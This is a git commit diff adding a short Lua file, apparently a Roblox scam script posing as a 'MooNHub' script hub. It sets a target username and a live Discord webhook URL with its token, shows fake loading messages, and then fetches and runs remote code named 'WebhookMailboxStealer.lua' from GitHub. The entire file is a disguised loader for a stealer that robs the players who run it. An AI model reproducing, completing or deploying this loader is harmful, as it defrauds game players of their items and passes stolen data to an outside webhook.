fb624e55b3219db5c762d2d6d91443963883c93d
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-07-03 22:28:28 +0700

    Moon

---
+++ Api/Main/ScamTradingScriptMoon/.lua
@@ -0,0 +1,9 @@
+Username = "charken_14"
+WebHook = "https://discord.com/api/webhooks/1125447508525580379/JquAYXFj2JROj2IGrmWLvvkTs5nhfUdUyd-eryBQ9hJqow3agJEb4F8D0lv4jhZV_8lR"
+loadingscreen = true
+_G.CustomScriptName = "MooNHub"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/WebhookMailboxStealer.lua"))()
